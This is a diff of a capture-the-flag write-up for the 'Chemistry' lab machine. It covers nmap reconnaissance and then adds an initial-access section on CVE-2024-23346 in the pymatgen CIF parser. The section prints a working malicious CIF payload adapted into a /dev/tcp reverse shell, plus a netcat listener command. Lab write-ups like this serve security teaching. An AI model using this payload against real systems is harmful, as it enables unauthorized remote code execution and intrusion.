@@ -12,7 +12,7 @@
 ## Recon
 Let's start by looking for open ports with an nmap scan.
 ```
-nmap -T5 -A -O -sC -p - -vv -oA chemistry-nmap 10.10.11.38
+nmap -T5 -A -O -sC -p - -vv -oA <FILE_NAME> 10.10.11.38
 ```
 <p> The nmap options break out to the following:<br>
 
@@ -28,7 +28,7 @@ nmap -T5 -A -O -sC -p - -vv -oA chemistry-nmap 10.10.11.38
 
 -vv: Increases the verbosity level, causing Nmap to print more information about the scan in progress.
 
--oA chemistry-nmap: Output in the three major formats at once.
+-oA <FILE_NAME>: Output in the three major formats at once.
 
 ```
 # Nmap 7.95 scan initiated Thu Feb 27 05:17:04 2025 as: /usr/lib/nmap/nmap -T5 -A -O -sC -p - -vv -oA chemistry-nmap 10.10.11.38
@@ -132,13 +132,68 @@ So let's feed this back to the CIF analyzer:
 
 ![](./.images/Screenshot_Chemistry-Dashboard-View.png)
 
-This appears to be the molecular breakdown of a hydroxide ion, neat! But this is not why I am here today.Time for research, "A CIF file stands for "Crystallographic Information File," which is a standard text format used to store detailed information about a crystal structure, including the positions of atoms within a crystal lattice, commonly used in crystallography and materials science to share and analyze crystal data; essentially, it's a way to digitally represent a crystal's atomic arrangement." 
+This appears to be the molecular breakdown of a hydroxide ion, neat! But this is not why I am here today. Time for research, "A CIF file stands for "Crystallographic Information File," which is a standard text format used to store detailed information about a crystal structure, including the positions of atoms within a crystal lattice, commonly used in crystallography and materials science to share and analyze crystal data; essentially, it's a way to digitally represent a crystal's atomic arrangement." 
 Searching for CVEs here is going to be awful so I took another approach, by focusing on the application itself "werkzeug". After some quick googling, I found the source on github <https://github.com/pallets/werkzeug>. The next objective is to find the documentation for version 3.0.3. From here we want to find the release history.
 
 ![](./.images/Screenshot_GitHub-Werkzeug_Version.png)
 
 ![](./.images/Screenshot_GitHub-Werkzeug_History.png)
 
-Now we know that version 3.0.3 went end of life "Aug 21, 2024". This means that we should be on the look out for exploits with a date after this date as they show still apply to this version. A little more googling later using our new found information takes us to our first CVE and our next section.
+Now we know that version 3.0.3 went end of life "Aug 21, 2024". This means that we should be on the look out for exploits with a date after this date as they should still apply to this version. A little more googling using our new found information takes us to our first CVE and our next section.
 
-## Initial Access or CVE-2024-23334
+## Initial Access or CVE-2024-23346
+Eventually I came across this page [CVE-2024-23346](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2fa). It's a lot confusing, but the best I can understand, there is a flaw in the code of one of the python libraries that was used in the creation of the tool. A carefully crafted cif file can be used to load additional python modules, including the module used to control the OS. Once that is loaded you can use it to execute whatever code you wish.
+
+We can use the following as a template to draft our exploit.
+
+```
+data_5yOhtAoR
+_audit_creation_date            2018-06-08
+_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"
+
+loop_
+_parent_propagation_vector.id
+_parent_propagation_vector.kxkykz
+k1 [0 0 0]
+
+_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("touch pwned");0,0,0'
+
+
+_space_group_magn.number_BNS  62.448
+_space_group_magn.name_BNS  "P  n'  m  a'  "
+```
+
+We will adjust it to meet our needs:
+
+```
+data_5yOhtAoR
+_audit_creation_date            2018-06-08
+_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"
+
+loop_
+_parent_propagation_vector.id
+_parent_propagation_vector.kxkykz
+k1 [0 0 0]
+
+_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/<IPADDRESS>/<PORT> 0>&1\'");0,0,0'
+
+_space_group_magn.number_BNS  62.448
+_space_group_magn.name_BNS  "P  n'  m  a'  "
+``` 
+
+Do not forget to change the "<IPADDRESS>/<PORT>" section to meet your needs. Save this as a ".cif", but before uploading, it would be a good idea to start up your listener. To accomplish this open a terminal and ensure that netcat is installed. My typical use is:
+
+```
+nc -lvnp <PORT>
+```
+<p> The nc options break out to the following:<br>
+
+-l: listen mode, for inbound connects
+
+-v: verbose
+
+-n: numeric-only IP addresses, no DNS
+
+-p <PORT>: local port number
+
+The "<PORT>" should match the "<PORT>" from your .cif with your carefully crafted exploit in it. 
